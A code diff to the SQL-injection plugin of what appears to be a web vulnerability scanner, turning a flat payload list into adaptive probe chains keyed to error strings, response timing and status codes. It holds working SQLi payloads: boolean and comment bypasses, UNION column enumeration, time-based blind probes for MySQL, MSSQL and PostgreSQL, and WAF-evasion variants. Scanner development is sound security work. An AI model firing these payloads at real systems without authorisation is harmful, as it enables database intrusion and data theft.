@@ -26,18 +26,122 @@ SQL_PARAM_KEYWORDS = frozenset({
     "name", "user", "username", "email", "keyword", "term",
 })
 
-# Payloads SQLi classiques
-SQLI_PAYLOADS = [
-    "' OR '1'='1",                        # boolean blind
-    "1' UNION SELECT NULL--",             # union column detection
-    "admin'--",                           # comment bypass
-    "' OR 1=1--",                         # simple bypass
-    "1' AND SLEEP(5)--",                  # MySQL time-based blind
-    "1' WAITFOR DELAY '0:0:5'--",        # MSSQL time-based blind
-    "1'; SELECT pg_sleep(5)--",          # PostgreSQL time-based blind
-    "1' OR 1=1/**/--",                   # WAF bypass with inline comment
-    "%27 OR %271%27%3D%271",             # URL-encoded bypass
-]
+# Chaînes de payloads adaptatives — chaque sonde détermine les follow-ups
+# La structure est : sonde → trigger_condition → follow_up_specs plus ciblés
+# En cas de non-trigger : 1 seul experiment vs 9 auparavant (réduction du bruit)
+
+def _sqli_chain(param_name: str, param_loc: str, ep_path: str) -> list[ExperimentSpec]:
+    """Construit la chaîne adaptative SQLi pour un paramètre donné."""
+
+    # Sonde 1 : détection d'erreur SQL (boolean + union detection)
+    sonde_union = ExperimentSpec(
+        mutation_type="field_injection",
+        base_request=NormalizedRequest(method="GET", url=""),
+        mutation_params={
+            "parameter_name": param_name, "endpoint_path": ep_path,
+            "parameter_location": param_loc, "payload": "' OR '1'='1",
+            "payload_type": "sqli",
+        },
+        description=f"SQLi probe: boolean blind {param_name}",
+        trigger_condition={"or": [
+            {"type": "body_matches_any", "value": [
+                "syntax error", "SQL", "mysql", "ORA-", "PostgreSQL", "MSSQL",
+                "sqlite", "Warning:", "You have an error",
+            ]},
+            {"type": "status_code", "operator": "==", "value": 500},
+        ]},
+        follow_up_specs=[
+            # Enumération colonnes UNION
+            ExperimentSpec(
+                mutation_type="field_injection",
+                base_request=NormalizedRequest(method="GET", url=""),
+                mutation_params={
+                    "parameter_name": param_name, "endpoint_path": ep_path,
+                    "parameter_location": param_loc,
+                    "payload": "1' UNION SELECT NULL,NULL,NULL--",
+                    "payload_type": "sqli",
+                },
+                description=f"SQLi UNION 3-col: {param_name}",
+            ),
+            # WAF bypass
+            ExperimentSpec(
+                mutation_type="field_injection",
+                base_request=NormalizedRequest(method="GET", url=""),
+                mutation_params={
+                    "parameter_name": param_name, "endpoint_path": ep_path,
+                    "parameter_location": param_loc,
+                    "payload": "1' OR 1=1/**/--",
+                    "payload_type": "sqli",
+                },
+                description=f"SQLi WAF bypass: {param_name}",
+            ),
+        ],
+    )
+
+    # Sonde 2 : time-based MySQL → si timing > 4s, tester les variantes MSSQL et PostgreSQL
+    sonde_timing = ExperimentSpec(
+        mutation_type="field_injection",
+        base_request=NormalizedRequest(method="GET", url=""),
+        mutation_params={
+            "parameter_name": param_name, "endpoint_path": ep_path,
+            "parameter_location": param_loc, "payload": "1' AND SLEEP(5)--",
+            "payload_type": "sqli",
+        },
+        description=f"SQLi MySQL time-based: {param_name}",
+        trigger_condition={"type": "timing_ms", "operator": ">", "value": 4000},
+        follow_up_specs=[
+            ExperimentSpec(
+                mutation_type="field_injection",
+                base_request=NormalizedRequest(method="GET", url=""),
+                mutation_params={
+                    "parameter_name": param_name, "endpoint_path": ep_path,
+                    "parameter_location": param_loc,
+                    "payload": "1' WAITFOR DELAY '0:0:5'--",
+                    "payload_type": "sqli",
+                },
+                description=f"SQLi MSSQL time-based: {param_name}",
+            ),
+            ExperimentSpec(
+                mutation_type="field_injection",
+                base_request=NormalizedRequest(method="GET", url=""),
+                mutation_params={
+                    "parameter_name": param_name, "endpoint_path": ep_path,
+                    "parameter_location": param_loc,
+                    "payload": "1'; SELECT pg_sleep(5)--",
+                    "payload_type": "sqli",
+                },
+                description=f"SQLi PostgreSQL time-based: {param_name}",
+            ),
+        ],
+    )
+
+    # Sonde 3 : bypass commentaire → si 200, essayer bypass URL-encoded
+    sonde_comment = ExperimentSpec(
+        mutation_type="field_injection",
+        base_request=NormalizedRequest(method="GET", url=""),
+        mutation_params={
+            "parameter_name": param_name, "endpoint_path": ep_path,
+            "parameter_location": param_loc, "payload": "admin'--",
+            "payload_type": "sqli",
+        },
+        description=f"SQLi comment bypass: {param_name}",
+        trigger_condition={"type": "status_code", "operator": "==", "value": 200},
+        follow_up_specs=[
+            ExperimentSpec(
+                mutation_type="field_injection",
+                base_request=NormalizedRequest(method="GET", url=""),
+                mutation_params={
+                    "parameter_name": param_name, "endpoint_path": ep_path,
+                    "parameter_location": param_loc,
+                    "payload": "%27 OR %271%27%3D%271",
+                    "payload_type": "sqli",
+                },
+                description=f"SQLi URL-encoded bypass: {param_name}",
+            ),
+        ],
+    )
+
+    return [sonde_union, sonde_timing, sonde_comment]
 
 
 class SQLiPlugin(HDWPPlugin):
@@ -117,23 +221,9 @@ class SQLiPlugin(HDWPPlugin):
             endpoints = [ep for ep in model.endpoints if param.id in ep.parameters]
             ep_path = endpoints[0].path if endpoints else ""
 
-            # Créer une hypothèse avec plusieurs payloads
-            experiments: list[ExperimentSpec] = []
-            for payload in SQLI_PAYLOADS:  # Top 3 payloads
-                experiments.append(
-                    ExperimentSpec(
-                        mutation_type="field_injection",
-                        base_request=NormalizedRequest(method="GET", url=""),
-                        mutation_params={
-                            "parameter_name": param.name,
-                            "endpoint_path": ep_path,
-                            "parameter_location": param.location,
-                            "payload": payload,
-                            "payload_type": "sqli",
-                        },
-                        description=f"SQLi test: {param.name}={payload[:30]}",
-                    )
-                )
+            # Chaîne adaptative : 3 sondes racines avec follow-ups conditionnels
+            # Réduit le trafic HTTP de 9 requêtes à 1-3 si non vulnérable
+            experiments = _sqli_chain(param.name, param.location, ep_path)
 
             hypotheses.append(
                 Hypothesis(
